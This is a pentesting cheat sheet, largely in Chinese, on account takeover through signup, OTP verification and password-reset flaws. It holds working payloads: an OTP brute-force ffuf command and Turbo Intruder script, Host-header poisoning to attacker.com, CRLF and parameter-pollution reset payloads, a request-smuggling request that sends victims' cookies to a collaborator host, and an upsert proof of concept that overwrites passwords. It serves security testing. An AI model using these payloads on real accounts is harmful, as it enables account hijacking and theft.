# 注册与接管 漏洞

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- 尝试用已存在的用户名创建
- 尝试改变邮箱格式进行检测：
- 大写
- +1@
- 在邮箱中加入点
- 在邮箱本地部分使用特殊字符（%00, %09, %20）
- 在邮箱后添加空白字符：`test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- 尝试邮件提供商的规范化技巧（依赖服务）：
- Gmail 忽略点和子地址：`victim+1@gmail.com`, `v.ic.tim@gmail.com` 都会投递到 `victim@gmail.com`
- 部分提供商在本地部分不区分大小写
- 某些提供商接受 Unicode 混淆字符。尝试在本地部分使用 homoglyphs 和软连字符 `\u00AD`
- 滥用这些技巧以：绕过唯一性检查、获得重复账户/workspace 邀请，或在准备接管时阻止受害者注册（临时 DoS）

### Username Enumeration

检查是否能判断某用户名是否已在应用中注册。

- 不同的错误消息或 HTTP 状态码
- 时间差异（已存在用户可能会触发对 IdP/DB 的查询）
- 对已知邮箱，注册表单自动填充 profile 数据
- 检查团队/邀请流程：输入邮箱可能会泄露该账户是否存在

### Password Policy

创建用户时检查密码策略（验证是否允许使用弱密码）。\
在允许弱密码的情况下，你可能会尝试对凭证进行 bruteforce。

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)了解如何通过 **SQL Injections** 在注册表单中尝试账户接管或提取信息。

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

在注册后，尝试更改邮箱并检查该更改是否被正确验证，或是否可以更改为任意邮箱。

### More Checks

- 检查是否可以使用一次性邮箱（mailinator, yopmail, 1secmail, 等）或通过子地址绕过封锁列表，例如 `victim+mailinator@gmail.com`
- 超长密码（>200）可能导致 **DoS**
- 检查账户创建的速率限制
- 使用 username@**burp_collab**.net 并分析 **callback**
- 如果使用手机号验证，检查电话号码解析/注入的边缘情况

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Weak Email/Phone Verification (OTP/Magic Link)

注册流程通常通过数字 OTP 或 magic-link 令牌验证所有权。常见缺陷：

- 可猜测或过短的 OTP（4–6 位），且没有有效的速率限制或 IP/设备追踪。尝试并行猜测并切换 header/IP。
- OTP 在不同操作或账户间可复用，或未绑定到特定用户/操作（例如，相同代码既可用于登录也可用于注册，或在邮箱更改后仍可使用）。
- 多值走私：部分后端接受多个代码并在任一匹配时验证。尝试：
- `code=000000&code=123456`
- JSON 数组：`{"code":["000000","123456"]}`
- 混合参数名：`otp=000000&one_time_code=123456`
- 逗号/竖线分隔值：`code=000000,123456` 或 `code=000000|123456`
- 响应 oracle：通过状态/消息/响应体长度区分错误、过期或错误用户的代码。
- 令牌在成功后或密码/邮箱更改后未失效。
- 验证令牌未与 user agent/IP 绑定，允许来自攻击者控制页面的跨源完成。

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Parallel/concurrent guessing 用于绕过 sequential lockouts（使用 Turbo Intruder 在 Burp 中）：

<details>
<summary>Turbo Intruder 代码片段，用于泛滥 6‑digit OTP 尝试</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: 同时在两个会话中提交相同的有效 OTP；有时一个会话会成为已验证的攻击者账户，而受害者流程也同时成功。
- Also test Host header poisoning on verification links (same as reset poisoning below) 以在攻击者控制的主机上 leak 或完成验证。

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (在受害者注册之前)

当攻击者在受害者创建账户之前对受害者的邮箱执行操作，然后在之后重新获得访问权限时，会发生一类严重的问题。

关键测试技术（根据目标的流程调整）：

- Classic–Federated Merge
- 攻击者：用受害者邮箱注册一个 classic 帐户并设置密码
- 受害者：随后使用 SSO（相同邮箱）注册
- 不安全的合并可能导致双方仍然处于登录状态或恢复攻击者的访问权限
- Unexpired Session Identifier
- 攻击者：创建账户并保持一个长‑寿命会话（不要登出）
- 受害者：恢复/设置密码并开始使用账户
- 测试密码重置或启用 MFA 后旧会话是否仍然有效
- Trojan Identifier
- 攻击者：向预先创建的账户添加次要标识符（phone、附加 email，或将攻击者的 IdP 关联上去）
- 受害者：重置密码；随后攻击者使用 the trojan identifier 来重置/登录
- Unexpired Email Change
- 攻击者：发起邮箱变更为攻击者邮箱并拒绝确认
- 受害者：恢复账户并开始使用
- 攻击者：之后完成待定的邮箱变更以窃取账户
- Non‑Verifying IdP
- 攻击者：使用一个不验证邮箱所有权的 IdP 来声明 `victim@…`
- 受害者：通过 classic 路径注册
- 服务根据邮箱合并时未检查 `email_verified` 或执行本地验证

实用技巧

- 从 web/mobile bundles 中收集流程和端点。查找 classic signup、SSO linking、email/phone change 和 password reset 端点。
- 创建真实的自动化以在执行其他流程时保持会话活跃。
- 对于 SSO 测试，搭建一个测试 OIDC provider 并颁发带有 `email` 声明且 `email_verified=false` 的 tokens 给受害者地址，以检查 RP 是否信任未验证的 IdP。
- 在任何 password reset 或 email change 后，验证：
  - 所有其他会话和 tokens 是否被使无效，
  - 待定的 email/phone 变更能力是否被取消，
  - 之前关联的 IdPs/emails/phones 是否被重新验证。

注意：这些技术的详尽方法论和案例研究由 Microsoft 的 pre‑hijacking 研究记录（参见结尾的 References）。

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. 向你的邮箱请求 password reset
2. 点击 password reset 链接
3. 不要更改密码
4. 点击任何第三方网站（例如：Facebook、twitter）
5. 在 Burp Suite 代理中拦截该请求
6. 检查 referer header 是否 leaking password reset token。

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. 在 Burp Suite 中拦截 password reset 请求
2. 在 Burp Suite 中添加或编辑以下 headers：`Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 使用修改过的 header 转发请求\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. 查找基于 _host header_ 的 password reset URL，例如：`https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR 在 API 参数上 <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 攻击者需要使用他们的账户登录并进入 **Change password** 功能。
2. 启动 Burp Suite 并拦截请求
3. 将其发送到 repeater 选项卡并编辑参数：User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### 弱密码重置令牌 <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

密码重置令牌应为随机生成且每次唯一。\
尝试确定令牌是否会过期或是否始终相同，在某些情况下生成算法很弱且可被猜到。以下变量可能被算法使用。

- 时间戳
- UserID
- 用户邮箱
- 名和姓
- 出生日期
- Cryptography
- 仅数字
- 短令牌序列（字符在 \[A-Z,a-z,0-9] 之间）
- 令牌重用
- 令牌过期日期

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 使用 API/UI 触发针对特定邮箱的密码重置请求，例如: test@mail.com
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 在系统上注册一个用户名与受害者相同但在用户名前后插入空格的账号，例如：`"admin "`
2. 用你恶意的用户名请求密码重置。
3. 使用发送到你邮箱的令牌重置受害者密码。
4. 使用新密码登录受害者账号。

平台 CTFd 曾易受此攻击影响。\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### 账户接管 通过 Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. 在应用或子域中找到 XSS（如果 cookies 的作用域是父域：`*.domain.com`）
2. Leak the current **sessions cookie**
3. 使用该 cookie 以该用户身份认证

### 账户接管 通过 HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. 使用 **smuggler** 来检测 HTTP Request Smuggling 的类型 (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 构造一个请求，覆盖 `POST / HTTP/1.1`，包含如下数据：\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` 目的是将受害者重定向到 burpcollab 并窃取他们的 cookies\
3. 最终请求可能如下所示
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone 报告利用此漏洞\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. 为 CSRF 创建 payload，例如： “HTML form with auto submit for a password change”
2. 发送 payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token 可能用于对用户进行认证。

- 编辑 JWT，替换为另一个 User ID / Email
- 检查 JWT 签名是否脆弱


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

有些 signup handlers 在提供的 email 已存在时会执行 upsert。如果 endpoint 接受只包含 email 和 password 的最小 body 且不强制 ownership verification，向受害者的 email 发送请求会在 pre-auth 情况下覆盖他们的 password。

- Discovery: 从 bundled JS（或 mobile app traffic）收集 endpoint 名称，然后使用 ffuf/dirsearch 对类似 /parents/application/v4/admin/FUZZ 的 base paths 进行 fuzz。
- Method hints: 如果 GET 返回类似 "Only POST request is allowed." 的信息，通常表明正确的请求方法并且期望一个 JSON body。
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
示例 PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
影响：Full Account Takeover (ATO)，无需重置令牌、OTP 或电子邮件验证。

## 参考

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
